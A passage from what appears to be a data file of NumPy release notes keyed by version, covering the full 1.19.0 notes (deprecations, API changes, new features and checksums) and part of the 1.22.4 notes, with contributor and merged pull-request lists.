d915b8e07e277a443da4525fd36403ca4f14dcb9cd237ab6a9aff73119b71820  numpy-1.26.0rc1-cp312-cp312-musllinux_1_1_x86_64.whl\n    3042f503964e1e5decacdfd0eeb0ed9eadf9b70ad1a8bb085ee277bd3ddf4362  numpy-1.26.0rc1-cp312-cp312-win_amd64.whl\n    3080a9ec21470a9b485e92a09baedb5136468d89b2f2a1896a27fa9e36341af2  numpy-1.26.0rc1-cp39-cp39-macosx_10_9_x86_64.whl\n    dd42d283561d0fe8911ff0576495a09928a3b53de2c5a6d1959e34a393e8ff65  numpy-1.26.0rc1-cp39-cp39-macosx_11_0_arm64.whl\n    d881436a9b325fa357b7ac32aac0be8c74921ab0f09d47139553e5da23383bc6  numpy-1.26.0rc1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    1c6967bfadb4723aa025a8a9870ff554f1b03c428740167ac6616c7df0c9d817  numpy-1.26.0rc1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    69580fae06143eb07300d1f1dace92f22dd4d47600e4832bea2b1685d7bc89e9  numpy-1.26.0rc1-cp39-cp39-musllinux_1_1_x86_64.whl\n    5241d904c9b651183c48b5b7f49e76715d96177def6a7a9bb5aa9e9984000786  numpy-1.26.0rc1-cp39-cp39-win_amd64.whl\n    6aa0bda5c93d09f8a0253cc902c6dc66de30228c08bd746d4cb4c73d7daee5bc  numpy-1.26.0rc1-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    b6e353a18acbbd0253115477879fef4253e284891f37d08eeda6bf77556d1534  numpy-1.26.0rc1-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    53a6d1f073f8cad9c97a6e7f16eac552475db8246ce379c961edeafb3d0e3152  numpy-1.26.0rc1-pp39-pypy39_pp73-win_amd64.whl\n    49a8cafece27db51fd9ec78c044546b15b0c9bf95466c57ada9eeae64075c2f8  numpy-1.26.0rc1.tar.gz\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.19.0": "==========================\nThis NumPy release is marked by the removal of much technical debt: support for\nPython 2 has been removed, many deprecations have been expired, and\ndocumentation has been improved. The polishing of the random module continues\napace with bug fixes and better usability from Cython.\n\nThe Python versions supported for this release are 3.6-3.8. Downstream\ndevelopers should use Cython >= 0.29.16 for Python 3.8 support and\nOpenBLAS >= 3.7 to avoid problems on the Skylake architecture.\n\n\nHighlights\n==========\n\n* Code compatibility with Python versions < 3.6 (including Python 2) was\n  dropped from both the python and C code. The shims in ``numpy.compat`` will\n  remain to support third-party packages, but they may be deprecated in a\n  future release. Note that 1.19.x will *not* compile with earlier versions of\n  Python due to the use of f-strings.\n\n  (`gh-15233 <https://github.com/numpy/numpy/pull/15233>`__)\n\n\nExpired deprecations\n====================\n\n``numpy.insert`` and ``numpy.delete`` can no longer be passed an axis on 0d arrays\n----------------------------------------------------------------------------------\nThis concludes a deprecation from 1.9, where when an ``axis`` argument was\npassed to a call to ``~numpy.insert`` and ``~numpy.delete`` on a 0d array, the\n``axis`` and ``obj`` argument and indices would be completely ignored.\nIn these cases, ``insert(arr, \"nonsense\", 42, axis=0)`` would actually overwrite the\nentire array, while ``delete(arr, \"nonsense\", axis=0)`` would be ``arr.copy()``\n\nNow passing ``axis`` on a 0d array raises ``~numpy.AxisError``.\n\n(`gh-15802 <https://github.com/numpy/numpy/pull/15802>`__)\n\n``numpy.delete`` no longer ignores out-of-bounds indices\n--------------------------------------------------------\nThis concludes deprecations from 1.8 and 1.9, where ``np.delete`` would ignore\nboth negative and out-of-bounds items in a sequence of indices. This was at\nodds with its behavior when passed a single index.\n\nNow out-of-bounds items throw ``IndexError``, and negative items index from the\nend.\n\n(`gh-15804 <https://github.com/numpy/numpy/pull/15804>`__)\n\n``numpy.insert`` and ``numpy.delete`` no longer accept non-integral indices\n---------------------------------------------------------------------------\nThis concludes a deprecation from 1.9, where sequences of non-integers indices\nwere allowed and cast to integers. Now passing sequences of non-integral\nindices raises ``IndexError``, just like it does when passing a single\nnon-integral scalar.\n\n(`gh-15805 <https://github.com/numpy/numpy/pull/15805>`__)\n\n``numpy.delete`` no longer casts boolean indices to integers\n------------------------------------------------------------\nThis concludes a deprecation from 1.8, where ``np.delete`` would cast boolean\narrays and scalars passed as an index argument into integer indices. The\nbehavior now is to treat boolean arrays as a mask, and to raise an error\non boolean scalars.\n\n(`gh-15815 <https://github.com/numpy/numpy/pull/15815>`__)\n\n\nCompatibility notes\n===================\n\nChanged random variate stream from ``numpy.random.Generator.dirichlet``\n-----------------------------------------------------------------------\nA bug in the generation of random variates for the Dirichlet distribution\nwith small 'alpha' values was fixed by using a different algorithm when\n``max(alpha) < 0.1``.  Because of the change, the stream of variates\ngenerated by ``dirichlet`` in this case will be different from previous\nreleases.\n\n(`gh-14924 <https://github.com/numpy/numpy/pull/14924>`__)\n\nScalar promotion in ``PyArray_ConvertToCommonType``\n---------------------------------------------------\nThe promotion of mixed scalars and arrays in ``PyArray_ConvertToCommonType``\nhas been changed to adhere to those used by ``np.result_type``.\nThis means that input such as ``(1000, np.array([1], dtype=np.uint8)))``\nwill now return ``uint16`` dtypes. In most cases the behaviour is unchanged.\nNote that the use of this C-API function is generally discouraged.\nThis also fixes ``np.choose`` to behave the same way as the rest of NumPy\nin this respect.\n\n(`gh-14933 <https://github.com/numpy/numpy/pull/14933>`__)\n\nFasttake and fastputmask slots are deprecated and NULL'ed\n---------------------------------------------------------\nThe fasttake and fastputmask slots are now never used and\nmust always be set to NULL. This will result in no change in behaviour.\nHowever, if a user dtype should set one of these a DeprecationWarning\nwill be given.\n\n(`gh-14942 <https://github.com/numpy/numpy/pull/14942>`__)\n\n``np.ediff1d`` casting behaviour with ``to_end`` and ``to_begin``\n-----------------------------------------------------------------\n``np.ediff1d`` now uses the ``\"same_kind\"`` casting rule for\nits additional ``to_end`` and ``to_begin`` arguments. This\nensures type safety except when the input array has a smaller\ninteger type than ``to_begin`` or ``to_end``.\nIn rare cases, the behaviour will be more strict than it was\npreviously in 1.16 and 1.17. This is necessary to solve issues\nwith floating point NaN.\n\n(`gh-14981 <https://github.com/numpy/numpy/pull/14981>`__)\n\nConverting of empty array-like objects to NumPy arrays\n------------------------------------------------------\nObjects with ``len(obj) == 0`` which implement an \"array-like\" interface,\nmeaning an object implementing ``obj.__array__()``,\n``obj.__array_interface__``, ``obj.__array_struct__``, or the python\nbuffer interface and which are also sequences (i.e. Pandas objects)\nwill now always retain there shape correctly when converted to an array.\nIf such an object has a shape of ``(0, 1)`` previously, it could\nbe converted into an array of shape ``(0,)`` (losing all dimensions\nafter the first 0).\n\n(`gh-14995 <https://github.com/numpy/numpy/pull/14995>`__)\n\nRemoved ``multiarray.int_asbuffer``\n-----------------------------------\nAs part of the continued removal of Python 2 compatibility,\n``multiarray.int_asbuffer`` was removed. On Python 3, it threw a\n``NotImplementedError`` and was unused internally. It is expected that there\nare no downstream use cases for this method with Python 3.\n\n(`gh-15229 <https://github.com/numpy/numpy/pull/15229>`__)\n\n``numpy.distutils.compat`` has been removed\n-------------------------------------------\nThis module contained only the function ``get_exception()``, which was used as::\n\n    try:\n        ...\n    except Exception:\n        e = get_exception()\n\nIts purpose was to handle the change in syntax introduced in Python 2.6, from\n``except Exception, e:`` to ``except Exception as e:``, meaning it was only\nnecessary for codebases supporting Python 2.5 and older.\n\n(`gh-15255 <https://github.com/numpy/numpy/pull/15255>`__)\n\n``issubdtype`` no longer interprets ``float`` as ``np.floating``\n----------------------------------------------------------------\n``numpy.issubdtype`` had a FutureWarning since NumPy 1.14 which\nhas expired now. This means that certain input where the second\nargument was neither a datatype nor a NumPy scalar type\n(such as a string or a python type like ``int`` or ``float``)\nwill now be consistent with passing in ``np.dtype(arg2).type``.\nThis makes the result consistent with expectations and leads to\na false result in some cases which previously returned true.\n\n(`gh-15773 <https://github.com/numpy/numpy/pull/15773>`__)\n\nChange output of ``round`` on scalars to be consistent with Python\n------------------------------------------------------------------\n\nOutput of the ``__round__`` dunder method and consequently the Python\nbuilt-in ``round`` has been changed to be a Python ``int`` to be consistent\nwith calling it on Python ``float`` objects when called with no arguments.\nPreviously, it would return a scalar of the ``np.dtype`` that was passed in.\n\n(`gh-15840 <https://github.com/numpy/numpy/pull/15840>`__)\n\nThe ``numpy.ndarray`` constructor no longer interprets ``strides=()`` as ``strides=None``\n-----------------------------------------------------------------------------------------\nThe former has changed to have the expected meaning of setting\n``numpy.ndarray.strides`` to ``()``, while the latter continues to result in\nstrides being chosen automatically.\n\n(`gh-15882 <https://github.com/numpy/numpy/pull/15882>`__)\n\nC-Level string to datetime casts changed\n----------------------------------------\nThe C-level casts from strings were simplified. This changed\nalso fixes string to datetime and timedelta casts to behave\ncorrectly (i.e. like Python casts using ``string_arr.astype(\"M8\")``\nwhile previously the cast would behave like\n``string_arr.astype(np.int_).astype(\"M8\")``.\nThis only affects code using low-level C-API to do manual casts\n(not full array casts) of single scalar values or using e.g.\n``PyArray_GetCastFunc``, and should thus not affect the vast majority\nof users.\n\n(`gh-16068 <https://github.com/numpy/numpy/pull/16068>`__)\n\n``SeedSequence`` with small seeds no longer conflicts with spawning\n-------------------------------------------------------------------\nSmall seeds (less than ``2**96``) were previously implicitly 0-padded out to\n128 bits, the size of the internal entropy pool. When spawned, the spawn key\nwas concatenated before the 0-padding. Since the first spawn key is ``(0,)``,\nsmall seeds before the spawn created the same states as the first spawned\n``SeedSequence``.  Now, the seed is explicitly 0-padded out to the internal\npool size before concatenating the spawn key. Spawned ``SeedSequences`` will\nproduce different results than in the previous release. Unspawned\n``SeedSequences`` will still produce the same results.\n\n(`gh-16551 <https://github.com/numpy/numpy/pull/16551>`__)\n\n\nDeprecations\n============\n\nDeprecate automatic ``dtype=object`` for ragged input\n-----------------------------------------------------\nCalling ``np.array([[1, [1, 2, 3]])`` will issue a ``DeprecationWarning`` as\nper `NEP 34`_. Users should explicitly use ``dtype=object`` to avoid the\nwarning.\n\n.. _`NEP 34`: https://numpy.org/neps/nep-0034.html\n\n(`gh-15119 <https://github.com/numpy/numpy/pull/15119>`__)\n\nPassing ``shape=0`` to factory functions in ``numpy.rec`` is deprecated\n-----------------------------------------------------------------------\n``0`` is treated as a special case and is aliased to ``None`` in the functions:\n\n* ``numpy.core.records.fromarrays``\n* ``numpy.core.records.fromrecords``\n* ``numpy.core.records.fromstring``\n* ``numpy.core.records.fromfile``\n\nIn future, ``0`` will not be special cased, and will be treated as an array\nlength like any other integer.\n\n(`gh-15217 <https://github.com/numpy/numpy/pull/15217>`__)\n\nDeprecation of probably unused C-API functions\n----------------------------------------------\nThe following C-API functions are probably unused and have been\ndeprecated:\n\n* ``PyArray_GetArrayParamsFromObject``\n* ``PyUFunc_GenericFunction``\n* ``PyUFunc_SetUsesArraysAsData``\n\nIn most cases ``PyArray_GetArrayParamsFromObject`` should be replaced\nby converting to an array, while ``PyUFunc_GenericFunction`` can be\nreplaced with ``PyObject_Call`` (see documentation for details).\n\n(`gh-15427 <https://github.com/numpy/numpy/pull/15427>`__)\n\nConverting certain types to dtypes is Deprecated\n------------------------------------------------\nThe super classes of scalar types, such as ``np.integer``, ``np.generic``,\nor ``np.inexact`` will now give a deprecation warning when converted\nto a dtype (or used in a dtype keyword argument).\nThe reason for this is that ``np.integer`` is converted to ``np.int_``,\nwhile it would be expected to represent *any* integer (e.g. also\n``int8``, ``int16``, etc.\nFor example, ``dtype=np.floating`` is currently identical to\n``dtype=np.float64``, even though also ``np.float32`` is a subclass of\n``np.floating``.\n\n(`gh-15534 <https://github.com/numpy/numpy/pull/15534>`__)\n\nDeprecation of ``round`` for ``np.complexfloating`` scalars\n-----------------------------------------------------------\nOutput of the ``__round__`` dunder method and consequently the Python built-in\n``round`` has been deprecated on complex scalars. This does not affect\n``np.round``.\n\n(`gh-15840 <https://github.com/numpy/numpy/pull/15840>`__)\n\n``numpy.ndarray.tostring()`` is deprecated in favor of ``tobytes()``\n--------------------------------------------------------------------\n``~numpy.ndarray.tobytes`` has existed since the 1.9 release, but until this\nrelease ``~numpy.ndarray.tostring`` emitted no warning. The change to emit a\nwarning brings NumPy in line with the builtin ``array.array`` methods of the\nsame name.\n\n(`gh-15867 <https://github.com/numpy/numpy/pull/15867>`__)\n\n\nC API changes\n=============\n\nBetter support for ``const`` dimensions in API functions\n--------------------------------------------------------\nThe following functions now accept a constant array of ``npy_intp``:\n\n* ``PyArray_BroadcastToShape``\n* ``PyArray_IntTupleFromIntp``\n* ``PyArray_OverflowMultiplyList``\n\nPreviously the caller would have to cast away the const-ness to call these\nfunctions.\n\n(`gh-15251 <https://github.com/numpy/numpy/pull/15251>`__)\n\nConst qualify UFunc inner loops\n-------------------------------\n``UFuncGenericFunction`` now expects pointers to const ``dimension`` and\n``strides`` as arguments. This means inner loops may no longer modify\neither ``dimension`` or ``strides``. This change leads to an\n``incompatible-pointer-types`` warning forcing users to either ignore\nthe compiler warnings or to const qualify their own loop signatures.\n\n(`gh-15355 <https://github.com/numpy/numpy/pull/15355>`__)\n\n\nNew Features\n============\n\n``numpy.frompyfunc`` now accepts an identity argument\n-----------------------------------------------------\nThis allows the :attr:``numpy.ufunc.identity`` attribute to be set on the\nresulting ufunc, meaning it can be used for empty and multi-dimensional\ncalls to :meth:``numpy.ufunc.reduce``.\n\n(`gh-8255 <https://github.com/numpy/numpy/pull/8255>`__)\n\n``np.str_`` scalars now support the buffer protocol\n---------------------------------------------------\n``np.str_`` arrays are always stored as UCS4, so the corresponding scalars\nnow expose this through the buffer interface, meaning\n``memoryview(np.str_('test'))`` now works.\n\n(`gh-15385 <https://github.com/numpy/numpy/pull/15385>`__)\n\n``subok`` option for ``numpy.copy``\n-----------------------------------\nA new kwarg, ``subok``, was added to ``numpy.copy`` to allow users to toggle\nthe behavior of ``numpy.copy`` with respect to array subclasses. The default\nvalue is ``False`` which is consistent with the behavior of ``numpy.copy`` for\nprevious numpy versions. To create a copy that preserves an array subclass with\n``numpy.copy``, call ``np.copy(arr, subok=True)``. This addition better\ndocuments that the default behavior of ``numpy.copy`` differs from the\n``numpy.ndarray.copy`` method which respects array subclasses by default.\n\n(`gh-15685 <https://github.com/numpy/numpy/pull/15685>`__)\n\n``numpy.linalg.multi_dot`` now accepts an ``out`` argument\n----------------------------------------------------------\n\n``out`` can be used to avoid creating unnecessary copies of the final product\ncomputed by ``numpy.linalg.multidot``.\n\n(`gh-15715 <https://github.com/numpy/numpy/pull/15715>`__)\n\n``keepdims`` parameter for ``numpy.count_nonzero``\n--------------------------------------------------\nThe parameter ``keepdims`` was added to ``numpy.count_nonzero``. The\nparameter has the same meaning as it does in reduction functions such\nas ``numpy.sum`` or ``numpy.mean``.\n\n(`gh-15870 <https://github.com/numpy/numpy/pull/15870>`__)\n\n``equal_nan`` parameter for ``numpy.array_equal``\n-------------------------------------------------\nThe keyword argument ``equal_nan`` was added to ``numpy.array_equal``.\n``equal_nan`` is a boolean value that toggles whether or not ``nan`` values are\nconsidered equal in comparison (default is ``False``). This matches API used in\nrelated functions such as ``numpy.isclose`` and ``numpy.allclose``.\n\n(`gh-16128 <https://github.com/numpy/numpy/pull/16128>`__)\n\n\nImprovements\n============\n\nImprove detection of CPU features\n=================================\nReplace ``npy_cpu_supports`` which was a gcc specific mechanism to test support\nof AVX with more general functions ``npy_cpu_init`` and ``npy_cpu_have``, and\nexpose the results via a ``NPY_CPU_HAVE`` c-macro as well as a python-level\n``__cpu_features__`` dictionary.\n\n(`gh-13421 <https://github.com/numpy/numpy/pull/13421>`__)\n\nUse 64-bit integer size on 64-bit platforms in fallback lapack_lite\n-------------------------------------------------------------------\nUse 64-bit integer size on 64-bit platforms in the fallback LAPACK library,\nwhich is used when the system has no LAPACK installed, allowing it to deal with\nlinear algebra for large arrays.\n\n(`gh-15218 <https://github.com/numpy/numpy/pull/15218>`__)\n\nUse AVX512 intrinsic to implement ``np.exp`` when input is ``np.float64``\n-------------------------------------------------------------------------\nUse AVX512 intrinsic to implement ``np.exp`` when input is ``np.float64``,\nwhich can improve the performance of ``np.exp`` with ``np.float64`` input 5-7x\nfaster than before. The ``_multiarray_umath.so`` module has grown about 63 KB\non linux64.\n\n(`gh-15648 <https://github.com/numpy/numpy/pull/15648>`__)\n\nAbility to disable madvise hugepages\n------------------------------------\nOn Linux NumPy has previously added support for madavise hugepages which can\nimprove performance for very large arrays.  Unfortunately, on older Kernel\nversions this led to peformance regressions, thus by default the support has\nbeen disabled on kernels before version 4.6. To override the default, you can\nuse the environment variable::\n\n    NUMPY_MADVISE_HUGEPAGE=0\n\nor set it to 1 to force enabling support. Note that this only makes\na difference if the operating system is set up to use madvise\ntransparent hugepage.\n\n(`gh-15769 <https://github.com/numpy/numpy/pull/15769>`__)\n\n``numpy.einsum`` accepts NumPy ``int64`` type in subscript list\n---------------------------------------------------------------\nThere is no longer a type error thrown when ``numpy.einsum`` is passed\na NumPy ``int64`` array as its subscript list.\n\n(`gh-16080 <https://github.com/numpy/numpy/pull/16080>`__)\n\n``np.logaddexp2.identity`` changed to ``-inf``\n----------------------------------------------\nThe ufunc ``~numpy.logaddexp2`` now has an identity of ``-inf``, allowing it to\nbe called on empty sequences.  This matches the identity of ``~numpy.logaddexp``.\n\n(`gh-16102 <https://github.com/numpy/numpy/pull/16102>`__)\n\n\nChanges\n=======\n\nRemove handling of extra argument to ``__array__``\n--------------------------------------------------\nA code path and test have been in the code since NumPy 0.4 for a two-argument\nvariant of ``__array__(dtype=None, context=None)``. It was activated when\ncalling ``ufunc(op)`` or ``ufunc.reduce(op)`` if ``op.__array__`` existed.\nHowever that variant is not documented, and it is not clear what the intention\nwas for its use. It has been removed.\n\n(`gh-15118 <https://github.com/numpy/numpy/pull/15118>`__)\n\n``numpy.random._bit_generator`` moved to ``numpy.random.bit_generator``\n-----------------------------------------------------------------------\nIn order to expose ``numpy.random.BitGenerator`` and\n``numpy.random.SeedSequence`` to Cython, the ``_bitgenerator`` module is now\npublic as ``numpy.random.bit_generator``\n\nCython access to the random distributions is provided via a ``pxd`` file\n------------------------------------------------------------------------\n``c_distributions.pxd`` provides access to the c functions behind many of the\nrandom distributions from Cython, making it convenient to use and extend them.\n\n(`gh-15463 <https://github.com/numpy/numpy/pull/15463>`__)\n\nFixed ``eigh`` and ``cholesky`` methods in ``numpy.random.multivariate_normal``\n-------------------------------------------------------------------------------\nPreviously, when passing ``method='eigh'`` or ``method='cholesky'``,\n``numpy.random.multivariate_normal`` produced samples from the wrong\ndistribution. This is now fixed.\n\n(`gh-15872 <https://github.com/numpy/numpy/pull/15872>`__)\n\nFixed the jumping implementation in ``MT19937.jumped``\n------------------------------------------------------\nThis fix changes the stream produced from jumped MT19937 generators. It does\nnot affect the stream produced using ``RandomState`` or ``MT19937`` that\nare directly seeded.\n\nThe translation of the jumping code for the MT19937 contained a reversed loop\nordering. ``MT19937.jumped`` matches the Makoto Matsumoto's original\nimplementation of the Horner and Sliding Window jump methods.\n\n(`gh-16153 <https://github.com/numpy/numpy/pull/16153>`__)\n\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    17e9b15e5b54f6963da30e9de93437b8  numpy-1.19.0-cp36-cp36m-macosx_10_9_x86_64.whl\n    2117953099e3343e6ac642de66c7127f  numpy-1.19.0-cp36-cp36m-manylinux1_i686.whl\n    fe0d7f18fd5af93cb027fe0e2462b3bc  numpy-1.19.0-cp36-cp36m-manylinux1_x86_64.whl\n    23a76cbf0cec80d59d48f2342de13cb2  numpy-1.19.0-cp36-cp36m-manylinux2010_i686.whl\n    3b35908cd21ce6558ec61806bbc9efee  numpy-1.19.0-cp36-cp36m-manylinux2010_x86_64.whl\n    b35af24ffa550054aadb620f6afb7d67  numpy-1.19.0-cp36-cp36m-manylinux2014_aarch64.whl\n    5d2a0e9c23383abed01c2795c6e9f2c1  numpy-1.19.0-cp36-cp36m-win32.whl\n    e0548c4ec436abb249d2e59ed5fd727f  numpy-1.19.0-cp36-cp36m-win_amd64.whl\n    3f939fa2f3b2f881862f7e02a0116970  numpy-1.19.0-cp37-cp37m-macosx_10_9_x86_64.whl\n    012026c54f196b8f342e4b49cb4b9294  numpy-1.19.0-cp37-cp37m-manylinux1_i686.whl\n    27227fdd6329f098fc9a85e9d40b1916  numpy-1.19.0-cp37-cp37m-manylinux1_x86_64.whl\n    a471c34d7a07468c09696165eae0cd57  numpy-1.19.0-cp37-cp37m-manylinux2010_i686.whl\n    27af6195869cd518f5d2a71885f21806  numpy-1.19.0-cp37-cp37m-manylinux2010_x86_64.whl\n    62dbe6623e9aebd2bb1aef6d1e0f815d  numpy-1.19.0-cp37-cp37m-manylinux2014_aarch64.whl\n    760e6b5681eea93cf6c85bcd1a739068  numpy-1.19.0-cp37-cp37m-win32.whl\n    d75a6104a6cce3c669e2363470d567bc  numpy-1.19.0-cp37-cp37m-win_amd64.whl\n    09f870d54906d964bd0f93b22695f9ae  numpy-1.19.0-cp38-cp38-macosx_10_9_x86_64.whl\n    ea9f4248d9ba0c647e07427cb542c2bf  numpy-1.19.0-cp38-cp38-manylinux1_i686.whl\n    11b7a5b055bb1417c8935d267b7d88de  numpy-1.19.0-cp38-cp38-manylinux1_x86_64.whl\n    6f6dec62163fa21259b7157516cc9e84  numpy-1.19.0-cp38-cp38-manylinux2010_i686.whl\n    ca83ee74cbdac0ffe3ec2c8c79294d67  numpy-1.19.0-cp38-cp38-manylinux2010_x86_64.whl\n    560567c2b3017ed146c3d08b0a58cadb  numpy-1.19.0-cp38-cp38-manylinux2014_aarch64.whl\n    d160b64e914c5f2e4807943c83dae54a  numpy-1.19.0-cp38-cp38-win32.whl\n    4e563e6434af5b90f1f99d9b916b2525  numpy-1.19.0-cp38-cp38-win_amd64.whl\n    a26c769ffe249f02cb73e6fbec7ff9ca  numpy-1.19.0-pp36-pypy36_pp73-manylinux2010_x86_64.whl\n    d59aadf47354bd10c7b9996032ba4da0  numpy-1.19.0.tar.gz\n    3f5ce88a859302f0a1aceb5f75b563fc  numpy-1.19.0.zip\n\nSHA256\n------\n::\n\n    63d971bb211ad3ca37b2adecdd5365f40f3b741a455beecba70fd0dde8b2a4cb  numpy-1.19.0-cp36-cp36m-macosx_10_9_x86_64.whl\n    b6aaeadf1e4866ca0fdf7bb4eed25e521ae21a7947c59f78154b24fc7abbe1dd  numpy-1.19.0-cp36-cp36m-manylinux1_i686.whl\n    13af0184177469192d80db9bd02619f6fa8b922f9f327e077d6f2a6acb1ce1c0  numpy-1.19.0-cp36-cp36m-manylinux1_x86_64.whl\n    356f96c9fbec59974a592452ab6a036cd6f180822a60b529a975c9467fcd5f23  numpy-1.19.0-cp36-cp36m-manylinux2010_i686.whl\n    fa1fe75b4a9e18b66ae7f0b122543c42debcf800aaafa0212aaff3ad273c2596  numpy-1.19.0-cp36-cp36m-manylinux2010_x86_64.whl\n    cbe326f6d364375a8e5a8ccb7e9cd73f4b2f6dc3b2ed205633a0db8243e2a96a  numpy-1.19.0-cp36-cp36m-manylinux2014_aarch64.whl\n    a2e3a39f43f0ce95204beb8fe0831199542ccab1e0c6e486a0b4947256215632  numpy-1.19.0-cp36-cp36m-win32.whl\n    7b852817800eb02e109ae4a9cef2beda8dd50d98b76b6cfb7b5c0099d27b52d4  numpy-1.19.0-cp36-cp36m-win_amd64.whl\n    d97a86937cf9970453c3b62abb55a6475f173347b4cde7f8dcdb48c8e1b9952d  numpy-1.19.0-cp37-cp37m-macosx_10_9_x86_64.whl\n    a86c962e211f37edd61d6e11bb4df7eddc4a519a38a856e20a6498c319efa6b0  numpy-1.19.0-cp37-cp37m-manylinux1_i686.whl\n    d34fbb98ad0d6b563b95de852a284074514331e6b9da0a9fc894fb1cdae7a79e  numpy-1.19.0-cp37-cp37m-manylinux1_x86_64.whl\n    658624a11f6e1c252b2cd170d94bf28c8f9410acab9f2fd4369e11e1cd4e1aaf  numpy-1.19.0-cp37-cp37m-manylinux2010_i686.whl\n    4d054f013a1983551254e2379385e359884e5af105e3efe00418977d02f634a7  numpy-1.19.0-cp37-cp37m-manylinux2010_x86_64.whl\n    26a45798ca2a4e168d00de75d4a524abf5907949231512f372b217ede3429e98  numpy-1.19.0-cp37-cp37m-manylinux2014_aarch64.whl\n    3c40c827d36c6d1c3cf413694d7dc843d50997ebffbc7c87d888a203ed6403a7  numpy-1.19.0-cp37-cp37m-win32.whl\n    be62aeff8f2f054eff7725f502f6228298891fd648dc2630e03e44bf63e8cee0  numpy-1.19.0-cp37-cp37m-win_amd64.whl\n    dd53d7c4a69e766e4900f29db5872f5824a06827d594427cf1a4aa542818b796  numpy-1.19.0-cp38-cp38-macosx_10_9_x86_64.whl\n    30a59fb41bb6b8c465ab50d60a1b298d1cd7b85274e71f38af5a75d6c475d2d2  numpy-1.19.0-cp38-cp38-manylinux1_i686.whl\n    df1889701e2dfd8ba4dc9b1a010f0a60950077fb5242bb92c8b5c7f1a6f2668a  numpy-1.19.0-cp38-cp38-manylinux1_x86_64.whl\n    33c623ef9ca5e19e05991f127c1be5aeb1ab5cdf30cb1c5cf3960752e58b599b  numpy-1.19.0-cp38-cp38-manylinux2010_i686.whl\n    26f509450db547e4dfa3ec739419b31edad646d21fb8d0ed0734188b35ff6b27  numpy-1.19.0-cp38-cp38-manylinux2010_x86_64.whl\n    7b57f26e5e6ee2f14f960db46bd58ffdca25ca06dd997729b1b179fddd35f5a3  numpy-1.19.0-cp38-cp38-manylinux2014_aarch64.whl\n    a8705c5073fe3fcc297fb8e0b31aa794e05af6a329e81b7ca4ffecab7f2b95ef  numpy-1.19.0-cp38-cp38-win32.whl\n    c2edbb783c841e36ca0fa159f0ae97a88ce8137fb3a6cd82eae77349ba4b607b  numpy-1.19.0-cp38-cp38-win_amd64.whl\n    8cde829f14bd38f6da7b2954be0f2837043e8b8d7a9110ec5e318ae6bf706610  numpy-1.19.0-pp36-pypy36_pp73-manylinux2010_x86_64.whl\n    153cf8b0176e57a611931981acfe093d2f7fef623b48f91176efa199798a6b90  numpy-1.19.0.tar.gz\n    76766cc80d6128750075378d3bb7812cf146415bd29b588616f72c943c00d598  numpy-1.19.0.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.22.4": "==========================\n\nNumPy 1.22.4 is a maintenance release that fixes bugs discovered after the\n1.22.3 release. In addition, the wheels for this release are built using the\nrecently released Cython 0.29.30, which should fix the reported problems with\n`debugging <https://github.com/numpy/numpy/issues/21008>`_.\n\nThe Python versions supported for this release are 3.8-3.10. Note that the Mac\nwheels are now based on OS X 10.14 rather than 10.6 that was used in previous\nNumPy release cycles. 10.14 is the oldest release supported by Apple.\n\nContributors\n============\n\nA total of 12 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Alexander Shadchin\n* Bas van Beek\n* Charles Harris\n* Hood Chatham\n* Jarrod Millman\n* John-Mark Gurney +\n* Junyan Ou +\n* Mariusz Felisiak +\n* Ross Barnowski\n* Sebastian Berg\n* Serge Guelton\n* Stefan van der Walt\n\nPull requests merged\n====================\n\nA total of 22 pull requests were merged for this release.\n\n* `21191 <https://github.com/numpy/numpy/pull/21191>`__: TYP, BUG: Fix ``np.lib.stride_tricks`` re-exported under the...\n* `21192 <https://github.com/numpy/numpy/pull/21192>`__: TST: Bump mypy from 0.931 to 0.940\n* `21243 <https://github.com/numpy/numpy/pull/21243>`__: MAINT: Explicitly re-export the types in ``numpy._typing``\n* `21245 <https://github.com/numpy/numpy/pull/21245>`__: MAINT: Specify sphinx, numpydoc versions for CI doc builds\n* `21275 <https://github.com/numpy/numpy/pull/21275>`__: BUG: Fix typos\n* `21277 <https://github.com/numpy/numpy/pull/21277>`__: ENH, BLD: Fix math feature detection for wasm\n* `21350 <https://github.com/numpy/numpy/pull/21350>`__: MAINT: Fix failing simd and cygwin tests.\n* `21438 <https://github.com/numpy/numpy/pull/21438>`__: MAINT: Fix failing Python 3.8 32-bit Windows test.\n* `21444 <https://github.com/numpy/numpy/pull/21444>`__: BUG: add linux guard per #21386\n* `21445 <https://github.com/numpy/numpy/pull/21445>`__: BUG: Allow legacy dtypes to cast to datetime again\n* `21446 <https://github.com/numpy/numpy/pull/21446>`__: BUG: Make mmap handling safer in frombuffer\n* `21447 <https://github.com/numpy/numpy/pull/21447>`__: BUG: Stop using PyBytesObject.ob_shash deprecated in Python 3.11.\n* `21448 <https://github.com/numpy/numpy/pull/21448>`__: ENH: Introduce numpy.core.setup_common.NPY_CXX_FLAGS\n* `21472 <https://github.com/numpy/numpy/pull/21472>`__: BUG: Ensure compile errors are raised correclty\n* `21473 <https://github.com/numpy/numpy/pull/21473>`__: BUG: Fix segmentation fault\n* `21474 <https://github.com/numpy/numpy/pull/21474>`__: MAINT: Update doc requirements\n* `21475 <https://github.com/numpy/numpy/pull/21475>`__: MAINT: Mark ``npy_memchr`` with ``no_sanitize(\"alignment\")`` on clang\n* `21512 <https://github.com/numpy/numpy/pull/21512>`__: DOC: Proposal - make the doc landing page cards more similar...\n* `21525 <https://github.com/numpy/numpy/pull/21525>`__: MAINT: Update Cython version to 0.29.30.\n* `21536 <https://github.com/numpy/numpy/pull/21536>`__: BUG: Fix GCC error during build configuration\n* `21541 <https://github.com/numpy/numpy/pull/21541>`__: REL: Prepare for the NumPy 1.22.4 release.\n* `21547 <https://github.com/numpy/numpy/pull/21547>`__: MAINT: Skip tests that fail on PyPy.\n\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    a19351fd3dc0b3bbc733495ed18b8f24  numpy-1.22.4-cp310-cp310-macosx_10_14_x86_64.whl\n    0730f9e196f70ad89f246bf95ccf05d5  numpy-1.22.4-cp310-cp310-macosx_10_15_x86_64.whl\n    63c74e5395a2b31d8adc5b1aa0c62471  numpy-1.22.4-cp310-cp310-macosx_11_0_arm64.whl\n    